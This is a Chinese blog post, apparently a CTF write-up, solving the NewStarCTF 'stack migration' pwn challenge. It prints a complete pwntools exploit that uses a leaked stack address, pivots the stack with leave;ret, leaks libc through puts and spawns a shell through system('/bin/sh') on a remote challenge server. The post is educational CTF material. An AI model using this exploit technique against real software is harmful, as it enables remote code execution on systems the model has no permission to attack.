@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="NewStarCTF---stack migration  我们可以先checksec一下：  拖入IDA中，查看反汇编代码：  给我们了一点小礼物%p,泄露buf的地址，也就是泄露一个栈上的地址，毕竟buf这玩意就在栈上，其实我们也能想到，溢出的地址是非常少的，所以我们得进行栈迁移，栈地址泄露了，又能向栈地址上写数据，所以我们考虑将栈迁移到泄露的地址上，payload如下： 1234567891">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStarCTF---stack migration">
+<meta property="og:url" content="http://example.com/2024/06/12/NewStarCTF-stack-migration/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="NewStarCTF---stack migration  我们可以先checksec一下：  拖入IDA中，查看反汇编代码：  给我们了一点小礼物%p,泄露buf的地址，也就是泄露一个栈上的地址，毕竟buf这玩意就在栈上，其实我们也能想到，溢出的地址是非常少的，所以我们得进行栈迁移，栈地址泄露了，又能向栈地址上写数据，所以我们考虑将栈迁移到泄露的地址上，payload如下： 1234567891">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/06/12/NewStarCTF-stack-migration/1.png">
+<meta property="og:image" content="http://example.com/2024/06/12/NewStarCTF-stack-migration/2.png">
+<meta property="og:image" content="http://example.com/2024/06/12/NewStarCTF-stack-migration/3.png">
+<meta property="article:published_time" content="2024-06-12T05:26:33.000Z">
+<meta property="article:modified_time" content="2024-06-12T06:57:23.793Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="栈迁移&amp;栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/12/NewStarCTF-stack-migration/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NewStarCTF---stack migration</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/06/15/%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%B4%E6%98%8Ecall-system-%E4%B8%8Esystem-plt%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/06/11/srop%E5%88%A9%E7%94%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/12/NewStarCTF-stack-migration/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&text=NewStarCTF---stack migration"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&is_video=false&description=NewStarCTF---stack migration"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NewStarCTF---stack migration&body=Check out this article: http://example.com/2024/06/12/NewStarCTF-stack-migration/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&name=NewStarCTF---stack migration&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/12/NewStarCTF-stack-migration/&t=NewStarCTF---stack migration"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">NewStarCTF---stack migration</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        NewStarCTF---stack migration
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-12T05:26:33.000Z" itemprop="datePublished">2024-06-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB-%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈迁移&栈溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">NewStarCTF---stack migration</h1>
+
+<p>我们可以先checksec一下：</p>
+<p><img src="/2024/06/12/NewStarCTF-stack-migration/1.png" alt="1"></p>
+<p>拖入IDA中，查看反汇编代码：</p>
+<p><img src="/2024/06/12/NewStarCTF-stack-migration/2.png" alt="2"></p>
+<p>给我们了一点小礼物%p,泄露buf的地址，也就是泄露一个栈上的地址，毕竟buf这玩意就在栈上，其实我们也能想到，溢出的地址是非常少的，所以我们得进行栈迁移，栈地址泄露了，又能向栈地址上写数据，所以我们考虑将栈迁移到泄露的地址上，payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">ret_addr = <span class="number">0x40101a</span> </span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4012AA</span></span><br><span class="line"><span class="comment">#sh = gdb.debug(&quot;./pwn&quot;,&quot;b *0x401230&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28301</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x401333</span></span><br><span class="line"><span class="comment">#sh = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = p64(pop_rdi_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;I have a small gift for you: &quot;</span>)</span><br><span class="line">stack_addr = sh.recv(<span class="number">14</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(stack_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr---------&gt;&quot;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload_1 = p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x4011FF</span>) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x38</span>) + p64(stack_addr-<span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line">sh.send(payload_1)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr---------&gt;&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base---------&gt;&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr---------&gt;&quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin_sh_addr---------&gt;&quot;</span>,<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">stack_addr_1 = stack_addr - <span class="number">0x40</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.send(p64(pop_rdi_ret))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload_2 = p64(bin_sh_addr) + p64(ret_addr)+ p64(system_addr) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x38</span>) + p64(stack_addr_1-<span class="number">0x8</span>) + p64(leave_ret) </span><br><span class="line">sh.send(payload_2)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们来解释一下payload，第一次发送8个字节p64(pop_rdi_ret)，然后收到泄露的buf地址，第二次发送0x60个字节，将栈迁移(esp寄存器)到stack_addr(buf在栈上的地址)，同时继续布置栈，让程序泄露puts函数的真实地址，并再次返回到主函数，此时栈的布局为：</p>
+<p><img src="/2024/06/12/NewStarCTF-stack-migration/3.png" alt="3"></p>
+<p>然后，按照上面的方法，如法炮制一边，就可以，成功的getshell了。</p>
+<p>值得注意的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload_2 = p64(bin_sh_addr) + p64(ret_addr)+ p64(system_addr) + b&quot;A&quot;*(0x38) + p64(stack_addr_1-0x8) + p64(leave_ret) </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload_2 = p64(bin_sh_addr) + p64(system_addr) + b&quot;A&quot;*(0x38+0x8) + p64(stack_addr_1-0x8) + p64(leave_ret) </span><br></pre></td></tr></table></figure>
+
+<p>不能写成下面那个样子，虽然说也没毛病，但是应该是栈对齐的问题，这一点真的是折磨我了，踩了个大坑。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">NewStarCTF---stack migration</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/12/NewStarCTF-stack-migration/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&text=NewStarCTF---stack migration"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&is_video=false&description=NewStarCTF---stack migration"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NewStarCTF---stack migration&body=Check out this article: http://example.com/2024/06/12/NewStarCTF-stack-migration/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&title=NewStarCTF---stack migration"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/12/NewStarCTF-stack-migration/&name=NewStarCTF---stack migration&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/12/NewStarCTF-stack-migration/&t=NewStarCTF---stack migration"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
